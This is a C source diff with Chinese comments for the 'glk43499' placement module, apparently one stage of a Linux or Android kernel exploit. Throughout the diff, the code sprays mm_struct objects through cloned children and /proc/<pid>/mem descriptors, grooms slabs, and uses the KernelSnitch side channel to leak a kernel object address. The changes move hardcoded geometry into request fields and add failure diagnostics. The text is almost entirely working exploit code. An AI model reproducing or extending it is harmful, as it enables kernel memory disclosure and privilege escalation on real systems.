@@ -34,8 +34,8 @@
 #include <sys/wait.h>
 #include <unistd.h>
 
-/* KernelSnitch 是 header-only 的 GNU C 检测器；只在本 TU 引入。 */
-#include "kernelsnitch/kernelsnitch.h"
+/* KernelSnitch 常量单源派生（B7）：新头包含 shared header，不改 shared。 */
+#include "kernelsnitch_bounds_internal.h"
 
 /* ========================================================================== */
 /* 内部工具                                                                    */
@@ -216,7 +216,11 @@ uint32_t glk43499_placement_kill_children(struct glk43499_ctx_set *set,
                                           int32_t *clean) {
     if (set == NULL || set->children == NULL) return 0;
     uint32_t reaped = 0;
-    /* stop：先给所有存活 child 发 SIGKILL；失败保留 pid 身份。 */
+    /* R3 共性 6：旧顺序是 close→kill→reap（legacy `support/util.cpp:696-701`：
+     * 先关 memfd 释放 mm_struct 引用，再杀 child，再 waitpid）；本函数改回该顺序。
+     * 每一步失败都保留身份并置 clean=0，禁止假 released。 */
+    (void) glk43499_placement_close_memfds(set, clean);
+    /* stop：给所有存活 child 发 SIGKILL；失败保留 pid 身份。 */
     for (uint32_t index = 0; index < set->count; ++index) {
         if (set->children[index] > 0) {
             if (kill(set->children[index], SIGKILL) != 0 && errno != ESRCH) {
@@ -224,7 +228,6 @@ uint32_t glk43499_placement_kill_children(struct glk43499_ctx_set *set,
             }
         }
     }
-    (void) glk43499_placement_close_memfds(set, clean);
     /* reap：逐个 waitpid；失败保留 pid 身份，不谎报回收。 */
     for (uint32_t index = 0; index < set->count; ++index) {
         if (set->children[index] > 0) {
@@ -346,23 +349,77 @@ static int32_t glk43499_placement_cleanup_all(
  * @note 失败语义：本函数保证失败时不留下半启动资源；不消费任何 token。
  * @note 阶段：preparePlacement 的 commit 前采集；无 PI 窗口、无日志。
  */
+struct glk43499_placement_geo {
+    uint64_t mm_struct_size;
+    uint64_t mm_partials;
+    uint64_t prepare_slabs;
+    uint64_t snitch_collisions;
+    uint64_t poll_us;
+    uint32_t slab_order;
+};
+
+/**
+ * @brief task-109：leak child open 失败证据（waitpid WNOHANG + /proc status Uid）。
+ * @param placement 非空 placement 对象（leak_child 已设置）。
+ * @param open_errno open 失败时的 errno。
+ * @note 仅在 open 失败路径调用；W NOHANG 只回收已退出 child（失败路径合法）。
+ */
+static void glk43499_placement_capture_leak_open(
+    struct glk43499_placement_impl *placement, int32_t open_errno) {
+    placement->diag_open_errno = open_errno;
+    const pid_t child = placement->leak_child;
+    placement->diag_child_pid = (int32_t) child;
+    placement->diag_child_reaped = 0;
+    placement->diag_child_status = 0;
+    placement->diag_child_proc_exists = 0;
+    placement->diag_child_uid = -1;
+    if (child <= 0) return;
+    int status = 0;
+    const pid_t reaped = waitpid(child, &status, WNOHANG);
+    if (reaped == child) {
+        placement->diag_child_reaped = 1;
+        placement->diag_child_status = status;
+    }
+    char path[64];
+    const int written = snprintf(path, sizeof(path), "/proc/%d/status", (int) child);
+    if (written <= 0 || (size_t) written >= sizeof(path)) return;
+    const int fd = open(path, O_RDONLY | O_CLOEXEC);
+    if (fd < 0) return;
+    placement->diag_child_proc_exists = 1;
+    char buffer[4096];
+    const ssize_t got = read(fd, buffer, sizeof(buffer) - 1);
+    (void) close(fd);
+    if (got <= 0) return;
+    buffer[got] = '\0';
+    const char *uid_line = strstr(buffer, "Uid:");
+    if (uid_line == NULL) return;
+    long uid = -1;
+    if (sscanf(uid_line, "Uid:%ld", &uid) == 1) {
+        placement->diag_child_uid = (int32_t) uid;
+    }
+}
+
 static int32_t glk43499_placement_acquire(
     struct glk43499_placement_impl *placement, uint32_t round,
-    uint64_t deadline_ns, int32_t *system_error) {
+    uint64_t deadline_ns, const struct glk43499_placement_geo *geo,
+    int32_t *system_error) {
     struct kernelsnitch_shared_state *snitch = NULL;
     int32_t success = 0;
     *system_error = 0;
 
     const uint32_t objects = placement->objects_per_slab;
-    const uint32_t prepare_count = objects * (uint32_t) GLK43499_PHYS_PREPARE_SLABS;
+    const uint32_t prepare_count =
+        objects * (uint32_t) geo->prepare_slabs;
     const uint32_t spray_count =
-        objects * (uint32_t) (1 + GLK43499_PHYS_MM_PARTIALS);
+        objects * (uint32_t) (1 + geo->mm_partials);
     const uint32_t pre_count = objects - 1;
     const uint32_t post_count = objects;
 
     if (placement->prepare.count != 0 || placement->spray.count != 0 ||
         placement->pre.count != 0 || placement->post.count != 0) {
         /* 上一轮必须已完整清理；否则状态不可证明，拒绝继续。 */
+        placement->diag_step = GLK43499_PLACEMENT_DIAG_STEP_ACQUIRE;
+        placement->diag_syscall = GLK43499_PLACEMENT_DIAG_SYSCALL_MISC;
         *system_error = EBUSY;
         return 0;
     }
@@ -371,6 +428,8 @@ static int32_t glk43499_placement_acquire(
         !glk43499_placement_ctx_alloc(&placement->spray, spray_count) ||
         !glk43499_placement_ctx_alloc(&placement->pre, pre_count) ||
         !glk43499_placement_ctx_alloc(&placement->post, post_count)) {
+        placement->diag_step = GLK43499_PLACEMENT_DIAG_STEP_ALLOC;
+        placement->diag_syscall = GLK43499_PLACEMENT_DIAG_SYSCALL_MISC;
         *system_error = ENOMEM;
         goto fail;
     }
@@ -378,6 +437,8 @@ static int32_t glk43499_placement_acquire(
 
     /* mm 塑形子进程按 placement_cpu 绑定；父进程采集期同样绑定。 */
     if (glk43499_internal_pin_cpu(placement->placement_cpu) != 0) {
+        placement->diag_step = GLK43499_PLACEMENT_DIAG_STEP_PIN_CPU;
+        placement->diag_syscall = GLK43499_PLACEMENT_DIAG_SYSCALL_SCHED_SETAFFINITY;
         *system_error = errno;
         goto fail;
     }
@@ -386,6 +447,8 @@ static int32_t glk43499_placement_acquire(
         const pid_t child =
             glk43499_placement_clone_child(placement->placement_cpu);
         if (child < 0) {
+            placement->diag_step = GLK43499_PLACEMENT_DIAG_STEP_CLONE_CHILD;
+            placement->diag_syscall = GLK43499_PLACEMENT_DIAG_SYSCALL_CLONE;
             *system_error = errno;
             goto fail;
         }
@@ -393,6 +456,8 @@ static int32_t glk43499_placement_acquire(
         ++placement->prepare.live_children;
         const int32_t memfd = glk43499_placement_open_memfd(child);
         if (memfd < 0) {
+            placement->diag_step = GLK43499_PLACEMENT_DIAG_STEP_OPEN_MEMFD;
+            placement->diag_syscall = GLK43499_PLACEMENT_DIAG_SYSCALL_OPEN;
             *system_error = errno;
             goto fail;
         }
@@ -403,6 +468,8 @@ static int32_t glk43499_placement_acquire(
         const pid_t child =
             glk43499_placement_clone_child(placement->placement_cpu);
         if (child < 0) {
+            placement->diag_step = GLK43499_PLACEMENT_DIAG_STEP_CLONE_CHILD;
+            placement->diag_syscall = GLK43499_PLACEMENT_DIAG_SYSCALL_CLONE;
             *system_error = errno;
             goto fail;
         }
@@ -410,6 +477,8 @@ static int32_t glk43499_placement_acquire(
         ++placement->spray.live_children;
         const int32_t memfd = glk43499_placement_open_memfd(child);
         if (memfd < 0) {
+            placement->diag_step = GLK43499_PLACEMENT_DIAG_STEP_OPEN_MEMFD;
+            placement->diag_syscall = GLK43499_PLACEMENT_DIAG_SYSCALL_OPEN;
             *system_error = errno;
             goto fail;
         }
@@ -421,12 +490,14 @@ static int32_t glk43499_placement_acquire(
         long online = sysconf(_SC_NPROCESSORS_ONLN);
         if (online <= 0) online = 1;
         snitch = kernelsnitch_setup(
-            (size_t) GLK43499_PHYS_MM_STRUCT_SIZE,
-            (size_t) GLK43499_PHYS_SLAB_ORDER, (size_t) online,
-            (size_t) GLK43499_PHYS_SNITCH_COLLISIONS, 0,
+            (size_t) geo->mm_struct_size,
+            (size_t) geo->slab_order, (size_t) online,
+            (size_t) geo->snitch_collisions, 0,
             (int) placement->placement_cpu);
     }
     if (snitch == NULL) {
+        placement->diag_step = GLK43499_PLACEMENT_DIAG_STEP_ALLOC;
+        placement->diag_syscall = GLK43499_PLACEMENT_DIAG_SYSCALL_MISC;
         *system_error = ENOMEM;
         goto fail;
     }
@@ -434,6 +505,8 @@ static int32_t glk43499_placement_acquire(
 
     if (glk43499_internal_pin_cpu(placement->measurement_cpu) != 0) {
         *system_error = errno;
+        placement->diag_step = GLK43499_PLACEMENT_DIAG_STEP_MEASUREMENT_PIN;
+        placement->diag_syscall = GLK43499_PLACEMENT_DIAG_SYSCALL_SCHED_SETAFFINITY;
         goto fail;
     }
 
@@ -441,6 +514,8 @@ static int32_t glk43499_placement_acquire(
         const pid_t child =
             glk43499_placement_clone_child(placement->placement_cpu);
         if (child < 0) {
+            placement->diag_step = GLK43499_PLACEMENT_DIAG_STEP_CLONE_CHILD;
+            placement->diag_syscall = GLK43499_PLACEMENT_DIAG_SYSCALL_CLONE;
             *system_error = errno;
             goto fail;
         }
@@ -450,12 +525,29 @@ static int32_t glk43499_placement_acquire(
     placement->leak_child = glk43499_placement_clone_leak_child(snitch);
     if (placement->leak_child < 0) {
         *system_error = errno;
+        placement->diag_step = GLK43499_PLACEMENT_DIAG_STEP_LEAK_CLONE;
+        placement->diag_syscall = GLK43499_PLACEMENT_DIAG_SYSCALL_CLONE;
+        goto fail;
+    }
+    /* task-109（A16 实测）：leak child 扫描可能很快退出；mm 引用必须在 clone 后**立即**
+     * 持有，否则父进程稍后 open /proc/<pid>/mem 会因 zombie/pid 复用得 EACCES。
+     * 顺序：leak clone → leak memfd open（紧邻）→ post clones → pre/post memfds；
+     * 不改变失败/retry 语义。 */
+    placement->leak_memfd = glk43499_placement_open_memfd(placement->leak_child);
+    if (placement->leak_memfd < 0) {
+        const int32_t leak_open_errno = errno;
+        glk43499_placement_capture_leak_open(placement, leak_open_errno);
+        placement->diag_step = GLK43499_PLACEMENT_DIAG_STEP_LEAK_OPEN;
+        placement->diag_syscall = GLK43499_PLACEMENT_DIAG_SYSCALL_OPEN;
+        *system_error = leak_open_errno;
         goto fail;
     }
     for (uint32_t index = 0; index < post_count; ++index) {
         const pid_t child =
             glk43499_placement_clone_child(placement->placement_cpu);
         if (child < 0) {
+            placement->diag_step = GLK43499_PLACEMENT_DIAG_STEP_CLONE_CHILD;
+            placement->diag_syscall = GLK43499_PLACEMENT_DIAG_SYSCALL_CLONE;
             *system_error = errno;
             goto fail;
         }
@@ -467,22 +559,20 @@ static int32_t glk43499_placement_acquire(
         const int32_t memfd =
             glk43499_placement_open_memfd(placement->pre.children[index]);
         if (memfd < 0) {
+            placement->diag_step = GLK43499_PLACEMENT_DIAG_STEP_OPEN_MEMFD;
+            placement->diag_syscall = GLK43499_PLACEMENT_DIAG_SYSCALL_OPEN;
             *system_error = errno;
             goto fail;
         }
         placement->pre.memfds[index] = memfd;
         ++placement->pre.open_memfds;
     }
-    placement->leak_memfd =
-        glk43499_placement_open_memfd(placement->leak_child);
-    if (placement->leak_memfd < 0) {
-        *system_error = errno;
-        goto fail;
-    }
     for (uint32_t index = 0; index < post_count; ++index) {
         const int32_t memfd =
             glk43499_placement_open_memfd(placement->post.children[index]);
         if (memfd < 0) {
+            placement->diag_step = GLK43499_PLACEMENT_DIAG_STEP_OPEN_MEMFD;
+            placement->diag_syscall = GLK43499_PLACEMENT_DIAG_SYSCALL_OPEN;
             *system_error = errno;
             goto fail;
         }
@@ -506,6 +596,8 @@ static int32_t glk43499_placement_acquire(
                 --set->live_children;
             } else {
                 *system_error = errno;
+                placement->diag_step = GLK43499_PLACEMENT_DIAG_STEP_ACQUIRE;
+                placement->diag_syscall = GLK43499_PLACEMENT_DIAG_SYSCALL_MISC;
                 goto fail;
             }
         }
@@ -520,6 +612,8 @@ static int32_t glk43499_placement_acquire(
             placement->leak_child = -1;
             if (!WIFEXITED(status) || WEXITSTATUS(status) != 0) {
                 *system_error = ECHILD;
+                placement->diag_step = GLK43499_PLACEMENT_DIAG_STEP_ACQUIRE;
+                placement->diag_syscall = GLK43499_PLACEMENT_DIAG_SYSCALL_MISC;
                 goto fail;
             }
             break;
@@ -527,20 +621,26 @@ static int32_t glk43499_placement_acquire(
         if (reaped < 0) {
             if (errno == EINTR) continue;
             *system_error = errno;
+            placement->diag_step = GLK43499_PLACEMENT_DIAG_STEP_ACQUIRE;
+            placement->diag_syscall = GLK43499_PLACEMENT_DIAG_SYSCALL_MISC;
             goto fail;
         }
         if (glk43499_internal_expired(deadline_ns)) {
             (void) glk43499_placement_stop_child(placement->leak_child);
             placement->leak_child = -1;
             *system_error = ETIMEDOUT;
+            placement->diag_step = GLK43499_PLACEMENT_DIAG_STEP_ACQUIRE;
+            placement->diag_syscall = GLK43499_PLACEMENT_DIAG_SYSCALL_MISC;
             goto fail;
         }
-        (void) usleep((useconds_t) GLK43499_PHYS_POLL_US);
+        (void) usleep((useconds_t) geo->poll_us);
     }
     glk43499_placement_sync_account(placement);
 
     if (kernelsnitch_found_collisions(snitch) == 0) {
         *system_error = EAGAIN;
+        placement->diag_step = GLK43499_PLACEMENT_DIAG_STEP_ACQUIRE;
+        placement->diag_syscall = GLK43499_PLACEMENT_DIAG_SYSCALL_MISC;
         goto fail;
     }
 
@@ -553,21 +653,29 @@ static int32_t glk43499_placement_acquire(
         snitch = NULL;
         if (leaked_raw == (size_t) -1) {
             *system_error = EAGAIN;
+            placement->diag_step = GLK43499_PLACEMENT_DIAG_STEP_ACQUIRE;
+            placement->diag_syscall = GLK43499_PLACEMENT_DIAG_SYSCALL_MISC;
             goto fail;
         }
         uint64_t leaked = (uint64_t) leaked_raw;
-        leaked |= GLK43499_PHYS_LEAK_TAG_NIBBLE << GLK43499_PHYS_LEAK_TAG_SHIFT;
-        if (leaked < GLK43499_PHYS_IDENTITY_START ||
-            leaked >= GLK43499_PHYS_IDENTITY_END ||
+        leaked |= placement->leak_tag_nibble << placement->leak_tag_shift;
+        /* A 决策（R2b）：泄漏地址必须落在请求的 identity 区间内，且该区间
+         * 已被 validate 证明包含于 scan 区间；不再内置任何地址空间边界。 */
+        if (leaked < placement->identity_start ||
+            leaked >= placement->identity_end ||
             leaked < placement->scan_lower_bound ||
             leaked >= placement->scan_upper_bound) {
             *system_error = ERANGE;
+            placement->diag_step = GLK43499_PLACEMENT_DIAG_STEP_ACQUIRE;
+            placement->diag_syscall = GLK43499_PLACEMENT_DIAG_SYSCALL_MISC;
             goto fail;
         }
         const uint64_t base = leaked & ~(placement->allocation_size - 1);
         if (base % placement->required_alignment != 0 ||
             base % placement->scan_step != 0) {
             *system_error = ERANGE;
+            placement->diag_step = GLK43499_PLACEMENT_DIAG_STEP_ACQUIRE;
+            placement->diag_syscall = GLK43499_PLACEMENT_DIAG_SYSCALL_MISC;
             goto fail;
         }
         placement->measured_object_address = leaked;
@@ -599,23 +707,63 @@ fail:
  * @param request 已通过 ABI 头校验的请求。
  * @param placement 非空对象（只写输入事实字段）。
  * @return 1 接受；0 拒绝（调用方回 INVALID_ARGUMENT）。
- * @note 只做非零/范围/对齐/溢出/物理上限校验；不填默认值、不做整数回绕。
+ * @note 只做非零/范围/对齐/溢出/跨字段不变量校验；不填默认值、不做整数回绕。
+ * @note A 决策（R2b）：容量/协议值全部来自请求字段（max_context_entries /
+ *       staging_capacity / max_objects_per_slab / max_measurement_rounds /
+ *       identity_start,end / leak_tag_nibble,shift）；Native 不保留目标常量。
  * @note 阶段：preparePlacement 的 commit 前校验。
  */
 static int32_t glk43499_placement_validate(
     const struct glk43499_placement_request *request,
     struct glk43499_placement_impl *placement) {
     if (!glk43499_internal_valid_header(&request->abi,
-                                        (uint32_t) sizeof(*request)) ||
-        request->reserved32 != 0 ||
-        !glk43499_internal_zero_u64(
-            request->reserved,
-            sizeof(request->reserved) / sizeof(request->reserved[0]))) {
+                                        (uint32_t) sizeof(*request))) {
         return 0;
     }
-    /* 页几何：候选页基址的 mask 必须与本机物理页/slab 几何一致。 */
-    if (request->page_size != GLK43499_PHYS_PAGE_SIZE ||
-        request->allocation_size != GLK43499_PHYS_ALLOCATION_SIZE) {
+    /* 请求容量字段自身必须非零且有界（计数是 u32，容量不得超出其表示域）。 */
+    if (request->max_context_entries == 0 ||
+        request->max_context_entries > UINT32_MAX ||
+        request->max_objects_per_slab == 0 ||
+        request->max_objects_per_slab > UINT32_MAX ||
+        request->max_measurement_rounds == 0 ||
+        request->staging_capacity == 0) {
+        return 0;
+    }
+    /* 页/slab 几何：全部来自请求；Native 只校验自洽，不填默认值。 */
+    if (!glk43499_internal_valid_pow2(request->page_size) ||
+        !glk43499_internal_valid_pow2(request->allocation_size) ||
+        request->page_size > request->allocation_size ||
+        request->slab_order >= 64) {
+        return 0;
+    }
+    if ((request->allocation_size >> request->slab_order) !=
+        request->page_size) {
+        return 0;
+    }
+    /* 5.10 非整除 mm_struct（mondrian 960 vs allocation 32768）允许：
+     * legacy floor 语义 ⇒ objects_per_slab = floor(allocation_size / mm_struct_size)
+     * （legacy2 support.cpp:564 同式）；allocation 不要求是 mm_struct 的整数倍。
+     * A301SO 1024/32768 整除路径的 objects/行为数值不变。
+     * 派生式收敛到 placement.h 的单一助手，供 host 单测直接对拍。 */
+    uint32_t floor_objects = 0;
+    if (!glk43499_placement_objects_per_slab(request->allocation_size,
+                                             request->mm_struct_size,
+                                             &floor_objects) ||
+        request->objects_per_slab != floor_objects ||
+        request->objects_per_slab > request->max_objects_per_slab) {
+        return 0;
+    }
+    if (request->mm_partials == 0 || request->prepare_slabs == 0 ||
+        request->snitch_collisions < 2 ||
+        request->prepare_slabs > request->max_context_entries ||
+        request->mm_partials > request->max_context_entries) {
+        return 0;
+    }
+    /* staging：2 * allocation 必须落在请求的 staging 容量内（溢出安全）。 */
+    uint64_t staging_need = 0;
+    if (!glk43499_internal_mul_u64(request->allocation_size, UINT64_C(2),
+                                   &staging_need) ||
+        staging_need > request->staging_capacity) {
         return 0;
     }
     if (!glk43499_internal_valid_pow2(request->required_alignment) ||
@@ -623,46 +771,82 @@ static int32_t glk43499_placement_validate(
         request->allocation_size % request->required_alignment != 0) {
         return 0;
     }
+    /* scan 窗口：step 必须整除 allocation，窗口规模可表示；轮数受限。 */
     if (!glk43499_internal_valid_pow2(request->scan_step) ||
+        request->scan_step == 0 ||
         request->scan_step > request->allocation_size ||
         request->allocation_size % request->scan_step != 0) {
         return 0;
     }
-    if (request->scan_lower_bound < GLK43499_PHYS_IDENTITY_START ||
-        request->scan_upper_bound <= request->scan_lower_bound ||
-        request->scan_upper_bound > GLK43499_PHYS_IDENTITY_END) {
+    if (request->scan_lower_bound >= request->scan_upper_bound ||
+        (request->scan_upper_bound - request->scan_lower_bound) /
+                request->scan_step + 1 >
+            UINT32_MAX) {
         return 0;
     }
     if (request->scan_round_limit == 0 ||
-        request->scan_round_limit > GLK43499_PHYS_MAX_MEASUREMENT_ROUNDS) {
+        request->scan_round_limit > (uint64_t) UINT32_MAX ||
+        request->scan_round_limit > request->max_measurement_rounds) {
         return 0;
     }
+    /* B7：detector 扫描范围是编译期常量；Kotlin 请求只做事后校验，不能驱动扫描。
+     * identity/scan 边界与 scan_step 必须与 detector 常量严格相等，否则 fail-closed
+     * （具名 token `GLK43499_KERNELSNITCH_SCAN_BOUNDS_MISMATCH_REASON`；回执
+     * INVALID_ARGUMENT/system_error=EINVAL）。 */
+    if (request->identity_start != GLK43499_KERNELSNITCH_IDENTITY_START ||
+        request->identity_end != GLK43499_KERNELSNITCH_IDENTITY_END ||
+        request->scan_lower_bound != GLK43499_KERNELSNITCH_SCAN_LOWER_BOUND ||
+        request->scan_upper_bound != GLK43499_KERNELSNITCH_SCAN_UPPER_BOUND ||
+        request->scan_step != GLK43499_KERNELSNITCH_SCAN_STEP) {
+        return GLK43499_PLACEMENT_VALIDATE_SCAN_BOUNDS_MISMATCH;
+    }
+    /* identity 区间必须非空且包含于 scan 区间（Kotlin 明列，Native 只校验包含）。 */
+    if (request->identity_end <= request->identity_start ||
+        request->identity_start < request->scan_lower_bound ||
+        request->identity_end > request->scan_upper_bound) {
+        return 0;
+    }
+    /* LEAK_TAG 域：nibble∈[0,15]、shift∈[0,63]（wire 协议域，仅做域校验）。 */
+    if (request->leak_tag_nibble >= 16 || request->leak_tag_shift >= 64) {
+        return 0;
+    }
+    /* 超时：非零且 deadline 加法不溢出（不内置“1 小时”目标上限）。 */
+    const uint64_t now_ns = glk43499_internal_now_ns();
     if (request->timeout_ns == 0 ||
-        request->timeout_ns > UINT64_C(3600000000000)) {
+        request->timeout_ns > UINT64_MAX - now_ns) {
+        return 0;
+    }
+    /* poll 间隔必须落在请求超时内（跨字段不变量，替代固定 1e6 上限）。 */
+    uint64_t poll_ns = 0;
+    if (!glk43499_internal_mul_u64(request->poll_us, UINT64_C(1000),
+                                   &poll_ns) ||
+        poll_ns > request->timeout_ns) {
         return 0;
     }
     if (!glk43499_internal_valid_cpu(request->placement_cpu) ||
         !glk43499_internal_valid_cpu(request->measurement_cpu)) {
         return 0;
     }
-    /* 数量形状是物理事实（旧实现固定 8 / 1+5 / objs-1 / objs），不是默认值。 */
-    if (request->objects_per_slab == 0 ||
-        request->objects_per_slab > GLK43499_PHYS_MAX_OBJECTS_PER_SLAB ||
-        request->objects_per_slab != GLK43499_PHYS_OBJECTS_PER_SLAB) {
+    /* 数量形状由请求的 slab/partials 推导；推导值必须与请求计数一致。 */
+    const uint64_t objects = request->objects_per_slab;
+    uint64_t prepare_expected = 0;
+    uint64_t spray_expected = 0;
+    if (!glk43499_internal_mul_u64(objects, request->prepare_slabs,
+                                   &prepare_expected) ||
+        !glk43499_internal_mul_u64(objects, request->mm_partials + 1,
+                                   &spray_expected)) {
         return 0;
     }
-    const uint64_t objects = request->objects_per_slab;
-    if (request->prepare_object_count != objects * GLK43499_PHYS_PREPARE_SLABS ||
-        request->spray_object_count !=
-            objects * (1 + GLK43499_PHYS_MM_PARTIALS) ||
+    if (request->prepare_object_count != prepare_expected ||
+        request->spray_object_count != spray_expected ||
         request->pre_object_count + 1 != objects ||
         request->post_object_count != objects) {
         return 0;
     }
-    if (request->prepare_object_count > GLK43499_PHYS_MAX_CONTEXT_ENTRIES ||
-        request->spray_object_count > GLK43499_PHYS_MAX_CONTEXT_ENTRIES ||
-        request->pre_object_count > GLK43499_PHYS_MAX_CONTEXT_ENTRIES ||
-        request->post_object_count > GLK43499_PHYS_MAX_CONTEXT_ENTRIES) {
+    if (request->prepare_object_count > request->max_context_entries ||
+        request->spray_object_count > request->max_context_entries ||
+        request->pre_object_count > request->max_context_entries ||
+        request->post_object_count > request->max_context_entries) {
         return 0;
     }
     placement->page_size = request->page_size;
@@ -675,6 +859,14 @@ static int32_t glk43499_placement_validate(
     placement->placement_cpu = request->placement_cpu;
     placement->measurement_cpu = request->measurement_cpu;
     placement->objects_per_slab = request->objects_per_slab;
+    placement->identity_start = request->identity_start;
+    placement->identity_end = request->identity_end;
+    placement->leak_tag_nibble = request->leak_tag_nibble;
+    placement->leak_tag_shift = request->leak_tag_shift;
+    placement->staging_capacity = request->staging_capacity;
+    placement->max_context_entries = request->max_context_entries;
+    placement->max_objects_per_slab = request->max_objects_per_slab;
+    placement->max_measurement_rounds = request->max_measurement_rounds;
     return 1;
 }
 
@@ -692,6 +884,40 @@ static int32_t glk43499_placement_validate(
  * @note 成功对象拥有 children、memfd、staging 与定位事实；测量资源当批释放。
  * @note 阶段：G4L-1；无 PI 窗口。
  */
+/**
+ * @brief task-104：把 placement 失败阶段/errno 统一发布到结果回执（copy 前不得 free）。
+ * @param result 输出回执（NULL 时 no-op）。
+ * @param placement 失败时仍有效的 placement 对象（NULL 表示早失败）。
+ * @note 只在 SYSTEM_ERROR/TIMEOUT 时给 UNKNOWN 兜底 ACQUIRE/MISC；成功保持 UNKNOWN/NONE。
+ */
+static void glk43499_placement_publish_diag(
+    struct glk43499_placement_result *result,
+    const struct glk43499_placement_impl *placement) {
+    if (result == NULL) return;
+    result->diag_step = placement != NULL ? placement->diag_step
+                                          : (uint32_t) GLK43499_PLACEMENT_DIAG_STEP_UNKNOWN;
+    result->diag_syscall = placement != NULL
+                               ? placement->diag_syscall
+                               : (uint32_t) GLK43499_PLACEMENT_DIAG_SYSCALL_NONE;
+    result->diag_errno = result->call.system_error > 0
+                             ? (uint32_t) result->call.system_error : 0u;
+    if (placement != NULL) {
+        result->diag_child_reaped = placement->diag_child_reaped;
+        result->diag_child_status = placement->diag_child_status;
+        result->diag_child_proc_exists = placement->diag_child_proc_exists;
+        result->diag_child_uid = placement->diag_child_uid;
+        result->diag_open_errno = placement->diag_open_errno;
+        result->diag_child_pid = placement->diag_child_pid;
+    }
+    if (result->call.call_status == GLK43499_CALL_SYSTEM_ERROR ||
+        result->call.call_status == GLK43499_CALL_TIMEOUT) {
+        if (result->diag_step == GLK43499_PLACEMENT_DIAG_STEP_UNKNOWN) {
+            result->diag_step = GLK43499_PLACEMENT_DIAG_STEP_ACQUIRE;
+            result->diag_syscall = GLK43499_PLACEMENT_DIAG_SYSCALL_MISC;
+        }
+    }
+}
+
 glk43499_handle glk43499_prepare_placement(
     const struct glk43499_placement_request *request,
     struct glk43499_placement_result *result) {
@@ -701,6 +927,8 @@ glk43499_handle glk43499_prepare_placement(
         return GLK43499_INVALID_HANDLE;
     }
     memset(&result->facts, 0, sizeof(result->facts));
+    memset(&result->diag_step, 0, sizeof(result->diag_step) + sizeof(result->diag_syscall) + sizeof(result->diag_errno));
+    struct glk43499_placement_impl *placement = NULL;
     if (request == NULL ||
         !glk43499_internal_valid_header(&request->abi,
                                         (uint32_t) sizeof(*request))) {
@@ -710,7 +938,7 @@ glk43499_handle glk43499_prepare_placement(
         return GLK43499_INVALID_HANDLE;
     }
 
-    struct glk43499_placement_impl *placement =
+    placement =
         (struct glk43499_placement_impl *) calloc(
             1, sizeof(struct glk43499_placement_impl));
     if (placement == NULL) {
@@ -722,14 +950,54 @@ glk43499_handle glk43499_prepare_placement(
     placement->leak_child = -1;
     placement->leak_memfd = -1;
 
-    if (!glk43499_placement_validate(request, placement)) {
+    const int32_t validation = glk43499_placement_validate(request, placement);
+    if (validation != GLK43499_PLACEMENT_VALIDATE_OK) {
+        placement->diag_step = GLK43499_PLACEMENT_DIAG_STEP_VALIDATE;
+        placement->diag_syscall = GLK43499_PLACEMENT_DIAG_SYSCALL_NONE;
+        const int32_t validation_errno =
+            validation == GLK43499_PLACEMENT_VALIDATE_SCAN_BOUNDS_MISMATCH
+                ? EINVAL
+                : 0;
+        glk43499_placement_free_staging(placement);
+        glk43499_placement_publish_diag(result, placement);
+        free(placement);
+        glk43499_internal_set_call(&result->call, GLK43499_CALL_INVALID_ARGUMENT,
+                                   GLK43499_EFFECT_NOT_APPLIED,
+                                   GLK43499_RESOURCE_INVALID,
+                                   validation_errno, 0);
+        return GLK43499_INVALID_HANDLE;
+    }
+    /* A 决策（R2b）：staging 由 Placement 在运行期按请求容量分配并独占。 */
+    if (placement->staging_capacity > (uint64_t) SIZE_MAX) {
+        placement->diag_step = GLK43499_PLACEMENT_DIAG_STEP_STAGING;
+        placement->diag_syscall = GLK43499_PLACEMENT_DIAG_SYSCALL_MISC;
+        glk43499_placement_publish_diag(result, placement);
         free(placement);
         glk43499_internal_set_call(&result->call, GLK43499_CALL_INVALID_ARGUMENT,
                                    GLK43499_EFFECT_NOT_APPLIED,
                                    GLK43499_RESOURCE_INVALID, 0, 0);
         return GLK43499_INVALID_HANDLE;
     }
+    placement->staging = (uint8_t *) malloc((size_t) placement->staging_capacity);
+    if (placement->staging == NULL) {
+        placement->diag_step = GLK43499_PLACEMENT_DIAG_STEP_STAGING;
+        placement->diag_syscall = GLK43499_PLACEMENT_DIAG_SYSCALL_MISC;
+        glk43499_placement_publish_diag(result, placement);
+        free(placement);
+        glk43499_internal_set_call(&result->call, GLK43499_CALL_SYSTEM_ERROR,
+                                   GLK43499_EFFECT_NOT_APPLIED,
+                                   GLK43499_RESOURCE_INVALID, ENOMEM, 0);
+        return GLK43499_INVALID_HANDLE;
+    }
 
+    const struct glk43499_placement_geo geo = {
+        .mm_struct_size = request->mm_struct_size,
+        .mm_partials = request->mm_partials,
+        .prepare_slabs = request->prepare_slabs,
+        .snitch_collisions = request->snitch_collisions,
+        .poll_us = request->poll_us,
+        .slab_order = (uint32_t) request->slab_order,
+    };
     const uint64_t deadline_ns = glk43499_internal_deadline(placement->timeout_ns);
     int32_t accepted = 0;
     int32_t last_error = 0;
@@ -739,7 +1007,7 @@ glk43499_handle glk43499_prepare_placement(
             last_error = ETIMEDOUT;
             break;
         }
-        if (glk43499_placement_acquire(placement, round, deadline_ns,
+        if (glk43499_placement_acquire(placement, round, deadline_ns, &geo,
                                        &last_error)) {
             accepted = 1;
             break;
@@ -759,8 +1027,11 @@ glk43499_handle glk43499_prepare_placement(
                                        GLK43499_EFFECT_DIRTY,
                                        GLK43499_RESOURCE_QUARANTINED,
                                        last_error, retained);
+            glk43499_placement_publish_diag(result, placement);
             return GLK43499_INVALID_HANDLE;
         }
+        glk43499_placement_publish_diag(result, placement);
+        glk43499_placement_free_staging(placement);
         free(placement);
         const glk43499_call_status status =
             last_error == ETIMEDOUT ? GLK43499_CALL_TIMEOUT
@@ -768,6 +1039,7 @@ glk43499_handle glk43499_prepare_placement(
         glk43499_internal_set_call(&result->call, status,
                                    GLK43499_EFFECT_NOT_APPLIED,
                                    GLK43499_RESOURCE_INVALID, last_error, 0);
+        result->diag_errno = last_error > 0 ? (uint32_t) last_error : 0u;
         return GLK43499_INVALID_HANDLE;
     }
 
@@ -780,15 +1052,10 @@ glk43499_handle glk43499_prepare_placement(
     result->facts.measurement_rounds = placement->measurement_rounds;
     result->facts.retained_child_count = placement->retained_children;
     result->facts.retained_descriptor_count = placement->retained_descriptors;
-    for (size_t index = 0;
-         index < sizeof(result->facts.reserved) /
-                     sizeof(result->facts.reserved[0]);
-         ++index) {
-        result->facts.reserved[index] = 0;
-    }
     glk43499_internal_set_call(&result->call, GLK43499_CALL_OK,
                                GLK43499_EFFECT_CLEAN_SUCCESS,
                                GLK43499_RESOURCE_PREPARED, 0, 0);
